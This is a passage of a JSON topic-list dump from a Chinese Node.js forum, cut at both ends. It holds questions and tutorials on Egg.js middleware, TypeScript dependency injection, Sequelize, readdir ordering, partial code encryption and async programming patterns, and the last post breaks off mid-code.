web、APP、桌面应用、后端","last_reply_at":"2019-05-06T01:44:41.473Z","good":false,"top":false,"reply_count":2,"visit_count":341,"create_at":"2019-05-05T02:39:59.164Z","author":{"loginname":"zuohuadong","avatar_url":"https://avatars0.githubusercontent.com/u/11203929?v=4&s=120"}},{"id":"5c0a92e415a4d545e3f4c5d7","author_id":"5bc9f0ca9545eaf107b9ccdd","tab":"ask","content":"<div class=\"markdown-text\"><p>要怎么去学习</p>\n</div>","title":"如何学习angular","last_reply_at":"2019-05-05T20:58:13.385Z","good":false,"top":false,"reply_count":24,"visit_count":2589,"create_at":"2018-12-07T15:33:56.403Z","author":{"loginname":"hhffhh","avatar_url":"https://avatars0.githubusercontent.com/u/3991376?v=4&s=120"}},{"id":"5ccee56c776fb66e0d1722dd","author_id":"55d15035b25bd72150842db8","tab":"ask","content":"<div class=\"markdown-text\"><p>1、中间件代码\nsharp_rotate.js</p>\n<pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;\nmodule.exports = () =&gt; {\n  return async function sharpRotate(ctx, next) {\n    const start = Date.now()\n    await next()\n    console.log(&#x27;rotate 时间消耗: &#x27;, Date.now() - start, &#x27;ms&#x27;)\n  }\n}\n</code></pre><p>2、中间件配置\nconfig.default.js</p>\n<pre class=\"prettyprint\"><code>middleware: [&#x27;sharpRotate&#x27;, &#x27;errorHandler&#x27;],\n</code></pre><p>3、执行 <code>npm start</code>\n本地mac OS环境正常\nlinux-64环境中间件代码一直被执行</p>\n<p><img src=\"//static.cnodejs.org/FhtVJSV9eu3WQdzwIMTu_BE6KM0j\" alt=\"image.png\"></p>\n</div>","title":"【eggjs】npm start 后，中间件中的代码一直被执行。","last_reply_at":"2019-05-05T14:58:33.466Z","good":false,"top":false,"reply_count":2,"visit_count":204,"create_at":"2019-05-05T13:30:20.008Z","author":{"loginname":"luckymore","avatar_url":"https://avatars0.githubusercontent.com/u/5390013?v=4&s=120"}},{"id":"5b164efa29e6e510415b2803","author_id":"5b164c1957137f22415c4958","tab":"ask","content":"<div class=\"markdown-text\"><p>首先，我是做移动端iOS，最近在学Node,目前再看Node in Action这本书，感觉自己有点像无头苍蝇。书中的很多例子都是构建web应用，而我的前端知识呢?还停留在小学水平，所有有点迷茫。</p>\n<p>能不能来个老司机来带带我，帮我看看怎么学习是最高效的.\n老司机们~</p>\n</div>","title":"移动端入门Node.js怎么学习?","last_reply_at":"2019-05-05T13:13:22.726Z","good":false,"top":false,"reply_count":65,"visit_count":6773,"create_at":"2018-06-05T08:51:06.562Z","author":{"loginname":"jincc","avatar_url":"https://avatars1.githubusercontent.com/u/12285323?v=4&s=120"}},{"id":"5ccec70f5a5bae6e07813200","author_id":"58cb34c8246a2aeb194a5489","tab":"share","content":"<div class=\"markdown-text\"><p>之前写过的一篇关于<a href=\"https://github.com/soraping/any-source/issues/14\">《前端<code>IOC</code> 的简单实践》</a>，基于本人是一个前端，设计模式的基础知识都不完备，所以内容不是太严谨，正在学习中！\n文章中提到了一个关键词：依赖注入。</p>\n<p>有小伙伴跟我提说在真实项目中如何使用的，我知道 <code>angular</code> 就是借鉴 <code>spring</code> 的 <code>ioc</code> ，奈何我没有用过，下面呢就来说说我之前在<code>nodejs</code>项目上的一些实践。</p>\n<p>去年，我贴了一个 <code>nodejs</code> 的简易web框架-- <a href=\"https://github.com/soraping/lenneth\">lenneth</a>，基于 <code>koa2</code> 搞的，简单说就是用装饰器模仿 <code>spring</code> 来写 <code>nodejs</code> 的注解（说注解习惯了，就不说装饰器了），看下示例：</p>\n<pre class=\"prettyprint language-js\"><code>import {\n  Controller,\n  Autowired,\n  Post,\n  Get,\n  RequestBody,\n  PathVariable,\n  Response,\n  TResponse,\n  UseBefore,\n  Description\n} from &quot;lenneth&quot;;\nimport { UserService } from &quot;..&#x2F;services&quot;;\nimport { IUserInfo } from &quot;..&#x2F;interface&quot;;\nimport { UserAuth, RuleAuth } from &quot;..&#x2F;middleware&quot;;\n\n@Controller(&quot;&#x2F;user&quot;)\nexport class UserController {\n  @Autowired()\n  userService: UserService;\n\n  @Post(&quot;&#x2F;add&quot;)\n  @Description(&quot;添加会员&quot;)\n  @UseBefore(UserAuth, RuleAuth)\n  async addUser(\n    @RequestBody() user: IUserInfo,\n    @Response() response: TResponse\n  ) {\n    response.body = this.userService.addUser(user);\n  }\n\n  @Get(&quot;&#x2F;detail&#x2F;:userId&quot;)\n  @UseBefore(UserAuth)\n  @Description(&quot;查询会员&quot;)\n  async getUser(\n    @PathVariable(&quot;userId&quot;) userId: string,\n    @Response() response: TResponse\n  ) {\n    response.body = this.userService.getUserInfo(userId);\n  }\n}\n</code></pre><p>看到这些注解，是不是很眼熟，就是从 <code>spring</code> 抄来的，具体介绍可以去项目里看看，下面来重点介绍实现 <code>Autowired</code> 注解的过程，也就是依赖注入的实践。</p>\n<p>看上面的实例，这个项目依赖了一个 <code>UserService</code> 类，在这个 <code>UserController</code> 这个方法中会用到这个依赖类的某个方法。</p>\n<p>依赖注入：</p>\n<pre class=\"prettyprint language-js\"><code>@Autowired()\nuserService: UserService;\n</code></pre><p>使用：</p>\n<pre class=\"prettyprint language-js\"><code>this.userService.addUser(user);\n</code></pre><p>来看下 <code>Autowired</code> 注解的实现：</p>\n<pre class=\"prettyprint language-js\"><code>import { Metadata } from &quot;@common&quot;;\nimport { descriptorOf, getClassName } from &quot;@utils&quot;;\n\n&#x2F;**\n * 注入service，类属性修饰器\n * @param params 实例化参数\n *&#x2F;\nexport const Autowired = (params: any = &quot;&quot;): Function =&gt; {\n  return (target: any, propertyKey: string) =&gt; {\n    &#x2F;&#x2F; 获取该属性的类型\n    let typeClass = Metadata.getType(target, propertyKey);\n    const descriptor = descriptorOf(target, propertyKey) || {\n      writable: true,\n      configurable: true\n    };\n    &#x2F;&#x2F; 实例化修饰类\n    descriptor.value = params ? new typeClass(params) : new typeClass();\n    Reflect.defineProperty(\n      (target &amp;&amp; target.prototype) || target,\n      propertyKey,\n      descriptor\n    );\n  };\n};\n\n</code></pre><p>解读这段实现之前，先引出了另一个概念–<strong>反射</strong>，就是在运行时动态获取一个对象的一切信息，包括方法/属性等等，特点在于动态类型反推导。</p>\n<p><a href=\"http://es6.ruanyifeng.com/#docs/reflect\"><code>Reflect</code></a> 是ES6新增的api，本身提供了不少静态方法，不过要使用还需要引入 <code>reflect-metadata</code> 这个库，为了使编译器在设计时将元数据序列化传给修饰器。</p>\n<p>通过反射能获得系统提供的<code>metadataKey</code>信息：</p>\n<ul>\n<li><code>design:type</code> 修饰目标对象的类型；</li>\n<li><code>design:paramtypes</code> 修饰目标对象方法的参数类型；</li>\n<li><code>design:returntype</code> 修饰目标对象方法返回值的类型；</li>\n</ul>\n<p>来看下案例：</p>\n<pre class=\"prettyprint language-js\"><code>import &quot;reflect-metadata&quot;;\n\nconst validate = () =&gt; {\n  return (target: any, propertyKey: string) =&gt; {\n    &#x2F;&#x2F; 修饰目标对象的类型\n    let type = Reflect.getMetadata(&quot;design:type&quot;, target, propertyKey);\n    &#x2F;&#x2F; 修饰目标的参数类型\n    let paramTypes = Reflect.getMetadata(\n      &quot;design:paramtypes&quot;,\n      target,\n      propertyKey\n    );\n    &#x2F;&#x2F; 修饰目标的返回值类型\n    let returnType = Reflect.getMetadata(\n      &quot;design:returntype&quot;,\n      target,\n      propertyKey\n    );\n    &#x2F;&#x2F; 所有能通过反射获取的元数据类型key\n    let allKeys = Reflect.getMetadataKeys(target, propertyKey);\n    console.log(&quot;type&quot;, type);\n    console.log(&quot;paramTypes&quot;, paramTypes);\n    console.log(&quot;returnType&quot;, returnType);\n    console.log(&quot;allKeys&quot;, allKeys);\n  };\n};\n\nclass Person {\n  private name: string;\n\n  @validate()\n  getInfo(tags: string): string {\n    return &#96;your name is ${this.name}, tags is ${tags}&#96;;\n  }\n}\n\n</code></pre><p>控制台展示：</p>\n<pre class=\"prettyprint language-bash\"><code>type function Function() { [native code] }\nparamTypes [ [Function: String] ]\nreturnType function String() { [native code] }\nallKeys [ &#x27;design:returntype&#x27;, &#x27;design:paramtypes&#x27;, &#x27;design:type&#x27; ]\n</code></pre><p>特别注意：<code>design:returntype</code> 依赖于所修饰方法的是否显式定义类型了，如果没有定义类型，那就会默认返回 <code>undefined</code>。</p>\n<p>我们也可以自定义 <code>metadataKey</code>，即在相应的类上定义自定义的元数据。</p>\n<pre class=\"prettyprint language-js\"><code>const service = () =&gt; {\n  return (target: any) =&gt; {\n    &#x2F;&#x2F; 自定义元数据，key 为 ServiceDecorator\n    Reflect.defineMetadata(&quot;ServiceDecorator&quot;, &quot;your personal value&quot;, target);\n  };\n};\n\n@service()\nclass Person {\n  private name: string;\n}\n\n&#x2F;&#x2F; 在合适的位置获取之前定义的元数据\n&#x2F;&#x2F; your personal value\nconsole.log(Reflect.getMetadata(&quot;ServiceDecorator&quot;, Person));\n</code></pre><p>自此，有了这个知识，在看上面的 <code>Autowired</code> 代码是不是简单的多了。</p>\n<p><code>Autowired</code> 注解的本质是一个属性修饰器，主要是考虑到会有参数传入，所以就写了一个高阶函数。修饰器本身就不做介绍了，可以看下阮一峰老师的es6教程。</p>\n<p>在方法内部，先获取了被修饰对象的类型，转换如下：</p>\n<pre class=\"prettyprint language-js\"><code>let typeClass = Reflect.getMetadata(&quot;design:type&quot;, target, propertyKey);\n</code></pre><p>这个 <code>metadataKey</code> 是系统提供的 <code>design:type</code>，获取被修饰对象的类型。</p>\n<pre class=\"prettyprint language-js\"><code>@Autowired()\nuserService: UserService;\n</code></pre><p>那这个 <code>typeClass</code> 的值就是 <code>UserService</code>。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 获取指定对象属性的描述对象\nconst descriptor = Reflect.getOwnPropertyDescriptor(target, propertyKey) || {\n      writable: true,\n      configurable: true\n    };\n</code></pre><p>这里就是获取 <code>UserController</code> 的 <code>userService</code> 属性的描述对象，那这个值有什么用呢？</p>\n<p><code>Reflect.getOwnPropertyDescriptor</code> 方法其实等同于 <code>Object.getOwnPropertyDescriptor</code> ，它会返回一个object:</p>\n<pre class=\"prettyprint language-js\"><code>{\n    value: &quot;value&quot;,\n    writable: true,\n    enumerable: true,\n    configurable: true\n}\n</code></pre><p>返回的四个字段中<code>value</code>就是这个属性的值，我们只要修改这个<code>value</code>字段，就可以实现注入了。</p>\n<pre class=\"prettyprint language-js\"><code>descriptor.value = params ? new typeClass(params) : new typeClass();\nReflect.defineProperty(\n  (target &amp;&amp; target.prototype) || target,\n  propertyKey,\n  descriptor\n);\n</code></pre><p>所以，最后修改了这个属性的描述对象的值，使它指向了所返回类型的实例对象，再重新定义这个属性的描述对象，这样编译后，<code>userService</code> 这个被修饰的属性就是<code>UserService</code> 的实例对象，能够访问到<code>UserService</code>内的属性方法了。</p>\n<p>如此，就实现了 <code>Autowired</code> 注解的功能了。</p>\n<p>完整示例：</p>\n<pre class=\"prettyprint language-js\"><code>const Autowired = (params: any = &quot;&quot;): Function =&gt; {\n  return (target: any, propertyKey: string) =&gt; {\n    &#x2F;&#x2F; 获取该属性的类型\n    let typeClass = Reflect.getMetadata(&quot;design:type&quot;, target, propertyKey);\n    const descriptor = Reflect.getOwnPropertyDescriptor(\n      target,\n      propertyKey\n    ) || {\n      writable: true,\n      configurable: true\n    };\n    &#x2F;&#x2F; 实例化修饰类\n    descriptor.value = params ? new typeClass(params) : new typeClass();\n    Reflect.defineProperty(\n      (target &amp;&amp; target.prototype) || target,\n      propertyKey,\n      descriptor\n    );\n  };\n};\n\nclass UserService {\n  getUserById(id: string) {\n    return &#96;user id is ${id}&#96;;\n  }\n}\n\nclass Person {\n  @Autowired()\n  private userService: UserService;\n  \n  getUserInfo(id: string) {\n    console.log(this.userService.getUserById(id));\n  }\n}\n\n&#x2F;&#x2F; user id is 12\nconsole.log(new Person().getUserInfo(&quot;12&quot;));\n</code></pre><p><a href=\"https://github.com/soraping/any-source/issues/15\">原文地址</a></p>\n</div>","title":"typescript依赖注入实践","last_reply_at":"2019-05-05T11:20:47.721Z","good":false,"top":false,"reply_count":0,"visit_count":274,"create_at":"2019-05-05T11:20:47.721Z","author":{"loginname":"soraping","avatar_url":"https://avatars2.githubusercontent.com/u/8610213?v=4&s=120"}},{"id":"5ccec2fc776fb66e0d172261","author_id":"54bc7fde0049cbcc5994c51f","tab":"share","content":"<div class=\"markdown-text\"><p>网上nodejs的加密基本上都是做成一个可执行文件，但是很多时候的需求是加密部分代码，而不是全部代码。我的思路是写一个解密的文件打包进node里面，可以参考nodejs教程https://github.com/nodejs/node/blob/master/BUILDING.md，如下\n<img src=\"//static.cnodejs.org/FtTIdMQtEcDCAqEX8mMD-WwVv4wh\" alt=\"image.png\"></p>\n<ol>\n<li>具体做法是我们自己创建一个文件类型jsxx，此文件放加密的代码。</li>\n</ol>\n<pre class=\"prettyprint language-js\"><code>Module._extensions[&quot;.jsxx&quot;] = function(module, filename) {\n\t&#x2F;&#x2F; 解密代码\t\n\t&#x2F;&#x2F; 禁用一些方法，比如说toString等\n};\n</code></pre><ol>\n<li>在启动主文件里面引用当前的模块既可，只有使用相对应的node才行正常启动。</li>\n</ol>\n<pre class=\"prettyprint language-js\"><code>require(&quot;jsxx&quot;);\n</code></pre></div>","title":"nodejs代码加密","last_reply_at":"2019-05-05T11:03:24.071Z","good":false,"top":false,"reply_count":0,"visit_count":277,"create_at":"2019-05-05T11:03:24.071Z","author":{"loginname":"einsqing","avatar_url":"https://avatars3.githubusercontent.com/u/7685948?v=4&s=120"}},{"id":"5b8de66137b3005a0b0e6b3f","author_id":"5b8de41bbf116a8c0e42579f","tab":"share","content":"<div class=\"markdown-text\"><p>Egg.js入门视频教程主要讲了Egg的环境搭建   egg的控制器      egg服务  egg中间件   egg路由 egg扩展   egg模板引擎  egg cookie   egg session</p>\n<p><strong>Eggjs 视频教程百度网盘分享接</strong>： <a href=\"https://pan.baidu.com/s/1t6XHpny8-H8mApLkzcsS8w\">https://pan.baidu.com/s/1t6XHpny8-H8mApLkzcsS8w</a></p>\n<p><strong>或者此连接Egg.js视频教程10讲入门链接</strong>： <a href=\"https://pan.baidu.com/s/1-jdCXKGgfk9yI8xJOOhPhg\">https://pan.baidu.com/s/1-jdCXKGgfk9yI8xJOOhPhg</a>  <strong>密码</strong>：4b6i</p>\n<p><strong>来源</strong>  <a href=\"https://cnodejs.org/topic/5b7ac9c7c52ad1482eb940bf\">https://cnodejs.org/topic/5b7ac9c7c52ad1482eb940bf</a></p>\n<p>希望老铁门能喜欢\n<img src=\"//static.cnodejs.org/FoPZNWCMpHqWFAb2QDns-UhIMX-3\" alt=\"egg01.png\"></p>\n<p><img src=\"//static.cnodejs.org/Fu4_-OevpWiKHFqeEGBOW53MCdnE\" alt=\"egg02.png\"></p>\n<p><img src=\"//static.cnodejs.org/FtOEkaeRTUNyuWE2mhvazrxPc6cd\" alt=\"egg03.png\"></p>\n<p><img src=\"//static.cnodejs.org/FtJsuDe3kbcNYWWcJyfxuE08wVs5\" alt=\"egg05.png\"></p>\n<p><img src=\"//static.cnodejs.org/Fp8erhbPkGZrsYFsd-gxn2z4Gssb\" alt=\"222.png\"></p>\n<p><img src=\"//static.cnodejs.org/FhCAuCKVwbQnTCJWtkGKv6ZR8toN\" alt=\"06.png\"></p>\n</div>","title":"Egg.js视频教程-Eggjs入门视频教程网盘免费分享-10讲入门基础希望老铁门能喜欢","last_reply_at":"2019-05-05T08:34:35.030Z","good":false,"top":false,"reply_count":93,"visit_count":12852,"create_at":"2018-09-04T01:56:49.179Z","author":{"loginname":"zlyuanteng","avatar_url":"https://avatars0.githubusercontent.com/u/42952042?v=4&s=120"}},{"id":"5cb9938d37faec0ce1d03cde","author_id":"5a52d060a89c475d7ea4fac3","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>模型定义</strong></p>\n<pre class=\"prettyprint\"><code>const Sequelize = require(&#x27;sequelize&#x27;);\nconst BaseModel = require(&#x27;.&#x2F;BaseModel&#x27;);\nconst sequelize = require(&#x27;..&#x2F;lib&#x2F;HealthCheck&#x27;).getCheckInstance().getMysqlConnection(); &#x2F;&#x2F;获取最下面定义的sequelize连接\nclass UserModel extends BaseModel {\n    constructor() {\n        super();\n    }\n    async addNewUser(params) {&#x2F;&#x2F;params是传过来的参数，主要是要添加的字段值，类型是Object\n        let addRuesult = await UserModel.findOrCreate({\n            where: {username: params.username},\n            defaults: {password: params.password, nickname: params.nickname, region: params.region, status: 11}\n        });\n\n        return addRuesult;\n    }\n}\n\n&#x2F;&#x2F;用户表模型定义\nUserModel.init({\n    id: {type: Sequelize.UUID, defaultValue: Sequelize.UUIDV1, allowNull: false, primaryKey: true},\n    username: {type: Sequelize.STRING, allowNull: false},\n    password: {type: Sequelize.STRING, allowNull: false},\n    nickname: Sequelize.STRING,\n    region: Sequelize.STRING,\n    status: {type: Sequelize.INTEGER(2), allowNull: false},\n    created_time: {type: Sequelize.DATE, allowNull: false},\n    last_login_time: Sequelize.DATE\n}, {\n    sequelize,\n    modelName: &#x27;user&#x27;,\n    timestamps: true,\n    createdAt: &#x27;created_time&#x27;,\n    updatedAt: &#x27;last_login_time&#x27;,\n    deletedAt: false\n});\n\nmodule.exports = UserModel;\n</code></pre><p><strong>BaseModel定义</strong></p>\n<pre class=\"prettyprint\"><code>const Sequelize = require(&#x27;sequelize&#x27;);\nconst Model = Sequelize.Model;\n\nclass BaseModel extends Model{\n    constructor() {\n        super();\n    }\n}\n\nmodule.exports = BaseModel;\n</code></pre><p><strong>数据库连接定义</strong></p>\n<pre class=\"prettyprint\"><code> let sequelize = new Sequelize({\n \thost: &#x27;127.0.0.1&#x27;,\n        port: 3306,\n        username: &#x27;root&#x27;,\n        password: &#x27;123456&#x27;,\n        database: &#x27;service&#x27;,\n        dialect: &#x27;mysql&#x27;,\n        define: {\n            freezeTableName: true\n        }\n });\n</code></pre><p><strong>问题</strong>\n模型定义由于有做字段值非空验证，结果sequelize会报验证非空错误，传过来的参数都是能正确获取到的，就是调用create或者findOrCreate方法时无法获取到字段值；我有试过在调用sequelize的方法时，直接将字段值写死，还是会报一样的错；大神们帮我看看到底是我定义错了，还是哪个地方出了问题？谢谢！</p>\n</div>","title":"sequelize v5版本使用create或者findOrCreate添加数据时，传过去的值都是undefined","last_reply_at":"2019-05-05T06:49:36.446Z","good":false,"top":false,"reply_count":9,"visit_count":1249,"create_at":"2019-04-19T09:23:25.976Z","author":{"loginname":"yss1993","avatar_url":"https://avatars1.githubusercontent.com/u/24558693?v=4&s=120"}},{"id":"5cc72448a86ae80ce64b5822","author_id":"54f5240d66c739e05459b2f4","tab":"ask","content":"<div class=\"markdown-text\"><p>使用node readdir返回的files文件顺序和在windows系统中看到的顺序不一样，怎么保持一致啊，文件夹命名有纯中文的，有数字加中文的</p>\n</div>","title":"readir读取文件夹顺序问题","last_reply_at":"2019-05-05T06:36:27.844Z","good":false,"top":false,"reply_count":2,"visit_count":549,"create_at":"2019-04-29T16:20:24.305Z","author":{"loginname":"weiketa","avatar_url":"https://avatars3.githubusercontent.com/u/7657987?v=4&s=120"}},{"id":"5cca7561a86ae80ce64b5f07","author_id":"5b31b09b57137f22415c4f4a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><strong>该文章阅读需要5分钟,更多文章请点击本人博客<a href=\"https://www.halu886.cn\">halu886</a></strong></p>\n</blockquote>\n<ul>\n<li><a href=\"#%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E9%9A%BE%E7%82%B9\">异步编程的难点</a>\n<ul>\n<li><a href=\"#%E5%87%BD%E6%95%B0%E5%B5%8C%E5%A5%97%E8%BF%87%E6%B7%B1\">函数嵌套过深</a></li>\n<li><a href=\"#%E9%98%BB%E5%A1%9E%E4%BB%A3%E7%A0%81\">阻塞代码</a></li>\n<li><a href=\"#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B\">多线程编程</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88\">异步编程解决方案</a>\n<ul>\n<li><a href=\"#%E4%BA%8B%E4%BB%B6%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F\">事件发布/订阅模式</a></li>\n<li><a href=\"#%E9%9B%86%E6%88%90events%E6%A8%A1%E5%9D%97\">集成events模块</a></li>\n<li><a href=\"#%E5%88%A9%E7%94%A8%E4%BA%8B%E4%BB%B6%E9%98%9F%E5%88%97%E8%A7%A3%E5%86%B3%E9%9B%AA%E5%B4%A9%E9%97%AE%E9%A2%98\">利用事件队列解决雪崩问题</a></li>\n</ul>\n</li>\n</ul>\n<h1>异步编程的难点</h1>\n<h2>函数嵌套过深</h2>\n<p>这应该是Node中最受人诟病的地方。在前端开发中，较少存在异步多级依赖的业务场景。</p>\n<pre class=\"prettyprint language-js\"><code>$(selector).click(function(event){\n    &#x2F;&#x2F; TODO\n});\n$(selector).change(function(event){\n    &#x2F;&#x2F; TODO\n})\n</code></pre><p>但是在Node中，事物中多级异步调用的场景比比皆是。</p>\n<pre class=\"prettyprint language-js\"><code>fs.readdir(path.join(_dirname,&#x27;..&#x27;),function(err,files){\n    files.forEach(function(filename,index){\n        fs.readFile(filename,&#x27;utf8&#x27;,funtion(err,file){\n            &#x2F;&#x2F; TODO\n        })\n    })\n})\n</code></pre><p>在上述场景中，因为两次操作存在依赖关系，嵌套情有可原。但是在网页渲染中，通常需要数据，模板，静态文件，但是三者并不相互依赖，但是最终渲染结果三者缺一不可，如果采用默认的异步方法调用。</p>\n<pre class=\"prettyprint language-js\"><code>fs.readFile(template_path,&#x27;utf8&#x27;,function(err,template){\n    db.query(sql,function(err,data){\n        l10n.get(function(err,resources){\n            &#x2F;&#x2F; TODO\n        })\n    })\n})\n</code></pre><p>虽然从结果上来说这是没有问题的，但是这并没有使用Node的并行优势。</p>\n<h2>阻塞代码</h2>\n<p>对于Javascript的开发者可能会困惑，如何实现沉睡线程的功能，<code>setTimeout()</code>和<code>setInterval()</code>能延后操作，但是不能阻塞后面的代码执行。\n所以，我们可能会这样实现<code>sleep(1000)</code>的效果。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; TODO\nvar start = new Date();\nwhile(new Date() - start &lt;1000){\n    &#x2F;&#x2F; TODO\n}\n&#x2F;&#x2F; 需要阻塞的代码\n</code></pre><p>但是事实却是，CPU会持续计算，根本就没有起到线程沉睡的功能，并且Node是单线程的，CPU所有的资源都在为这段代码服务，导致任何请求都得不到响应。</p>\n<p>存在这种需求，统一规划业务逻辑，调用setTimeout()实现效果会更好。</p>\n<h2>多线程编程</h2>\n<p>我们在讨论Javascript编程时，通常都是单线程编程，前端中UI渲染和Javascript执行线程共用一个线程。在Node中，只是没有UI渲染，模型基本相同。但是在多核服务器中，单个Node进程实际上没有充分利用多核CPU。随着业务复杂化，对于多核CPU的要求也会越来越高。浏览器提出Web Workers。它通常将Javascript执行与UI渲染分离，可以通过多核CPU进行大量运算。并且Web Worker也是一个通过消息机制合理使用多核CPU的合理模型。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-code-2/1.png?x-oss-process=style/halu-blog-watermark\" alt=\"1\"></p>\n<p>遗憾的是浏览器对于标准存在明显的滞后，导致Web Worker并没有广泛的应用。并且虽然Web Worker解决了多核CPU和渲染UI的问题，但是并没有解决UI渲染的效率问题。但是Node借鉴了Web Worker的模式，child_process是基础API，cluster则是它的深层次应用。</p>\n<h1>异步编程解决方案</h1>\n<p>以上我们列举了一下异步编程的缺点，和异步编程的高性能相比，编程过程看起来并没有那么完美。但是事实也并没有那么糟糕，与问题相比，解决方案总是更多。</p>\n<ul>\n<li>事件发布/订阅模式</li>\n<li>Promise/Deferred模式</li>\n<li>流程控制库</li>\n</ul>\n<h2>事件发布/订阅模式</h2>\n<p>事件监听器模式是广泛用于异步编程的模式，将回调函数异步化。又称发布/订阅模式</p>\n<p>Node自身的<a href=\"https://nodejs.org/docs/latest/api/events.html\">events模块</a>是发布订阅的一个简单实现，Node大多数模块都继承自它，这比前端的事件机制简单的多，不存在事件冒泡，也不存在<code>preventDefault()</code>,<code>stopPropagetion()</code>,<code>stopImmediatePropagation()</code>等控制事件传递的方法。具有<code>addListener/on()</code>，<code>once()</code>，<code>removeListener()</code>，<code>removeAllListeners()</code>和<code>emit()</code>等基本的事件监听模式的方法实现。</p>\n<pre class=\"prettyprint language-js\"><code>emitter.on(&quot;event1&quot;,function(message){\n    console.log(message);\n})\n\nemitter.emit(&#x27;event1&#x27;,&quot;I am message!&quot;);\n</code></pre><p>订阅事件是高阶函数的应用，一个事件能够与多个回调函数相关联，一个回调函数又称为事件监听器。当使用<code>emit()</code>发布事件后，消息会传递给注册的事件监听器都会被执行，并且监听器能够方便的添加或者删除，这样能够实现事件和具体逻辑的解耦。</p>\n<p>事件发布/订阅自身没有同步和异步的概念，<code>emit()</code>基于事件循环的概念而异步触发的。那么可以理解为发布/订阅模式应用于异步编程。</p>\n<p>事件发布/订阅模式模式主要用于业务的解耦，事件的发布者不用关心订阅的监听者的业务逻辑是什么，有多少个监听者，数据可以通过消息的方法灵活的流转。可以将一个流程中不变的封装成一个个组件，容易变化的暴露出去给外部处理，可以理解为事件的设计是组件的接口设计。</p>\n<p>从另外一个角度上来看，事件监听也是一种钩子（hook）模式，Node中大多数对象都是黑盒，可以通过事件将对象在运行状态的状态通过事件传递出来。</p>\n<pre class=\"prettyprint language-js\"><code>var options = {\n    host: &#x27;www.google.com&#x27;,\n    port: 80,\n    path: &#x27;&#x2F;upload&#x27;,\n    method: &#x27;POST&#x27;\n}\n\nvar req = http.request(options,function(res){\n    console.log(&#x27;STATUS&#x27; + res.statusCode);\n    console.log(&#x27;HEADERS:&#x27; + JSON.stringify(res.headers));\n\n    res.setEncoding(&#x27;utf8&#x27;);\n    res.on(&#x27;data&#x27;,function(chunk){\n        console.log(&#x27;BODY:&#x27;+chunk);\n    });\n\n    res.on(&#x27;end&#x27;,function(){\n        &#x2F;&#x2F; TODO\n    })\n    req.on(&#x27;error&#x27;,function(e){\n        console.log(&#x27;problem with request:&#x27; + e.message);\n    })\n    req.write(&#x27;data\\n&#x27;);\n    req.write(&#x27;data\\n&#x27;);\n    req.end();\n})\n</code></pre><p>在这段http请求中，我们只需要将重点放在error,data,end事件上，业务流程则不需要过于关注。</p>\n<p>下面有两个基于健壮性考虑的细节</p>\n<ul>\n<li>如果事件的监听器超过10个，将会获得一条警告，初衷是担心导致内存泄露。可以通过emitter.setMaxListeners(0)关闭这个限制。</li>\n<li>为了处理异常，当事件处理中发生了一个异常，实例会将这个异常传递给已经存在error监听者，如果不存在异常监听者进行捕获，这个异常将会向外抛出，最后如果没有被捕获，则会导致线程推出，一个健壮的EventEmitter应该有异常监听者。</li>\n</ul>\n<h2>集成events模块</h2>\n<p>实现继承一个EventEmitter类也很简单</p>\n<pre class=\"prettyprint language-js\"><code>var events = require(&#x27;events&#x27;);\n\nfunction Stream(){\n    events.EventEmitter.call(this);\n}\nutil.inherits(Stream,events.EventEmitter);\n</code></pre><p>使用util轻松的继承的EventEmitter事件，通过事件来解决业务问题，Node中核心模块有一半的对象继承了EventEmitter对象。</p>\n<h2>利用事件队列解决雪崩问题</h2>\n<p>在事件订阅/发布模式中，存在<code>once()</code>方法，事件和监听器关联，只会被执行一次，之后就会解除关联。这个可以帮助我们过滤掉一些重复性的事件响应。</p>\n<p>在计算机中，将缓存存储在内存中加快数据的读取。雪崩问题指的是当高访问量时，大并发量的情况下，缓存失效。此时大量请求涌入数据库，导致网站整体的性能。</p>\n<pre class=\"prettyprint language-js\"><code>var select = function(callback){\n    db.select(&quot;SQL&quot;,function(results){\n        callback(results);\n    })\n}\n</code></pre><p>如果站点刚好启动，此时缓存不存在数据，但是如果访问量巨大时，同一条sql会在数据库中反复查询，会影响服务的整体性能。</p>\n<p>可以添加一个状态锁。</p>\n<pre class=\"prettyprint language-js\"><code>var status = &quot;ready&quot;;\nvar select = function(callback){\n    if(status === &quot;ready&quot;){\n        status = &quot;pending&quot;;\n        db.select(&quot;SQL&quot;,function(results){\n            status = &quot;ready&quot;;\n            callback(results);\n        })\n    }\n}\n</code></pre><p>此时连续调用多次，只有第一条SQL执行成功，后续的SQL则是失效的。</p>\n<p>这个时候可以引入队列服务。</p>\n<pre class=\"prettyprint language-js\"><code>var proxy = new events.EventEmitter();\nvar status = &quot;ready&quot;;\nvar select = function(callback){\n    proxy.once(&quot;selected&quot;,callback);\n    if(status === &quot;ready&quot;){\n        status = &quot;pending&quot;;\n        db.select(&quot;SQL&quot;,function(results){\n            proxy.emit(&quot;selected&quot;,results);\n            status = &quot;ready&quot;;\n        })\n    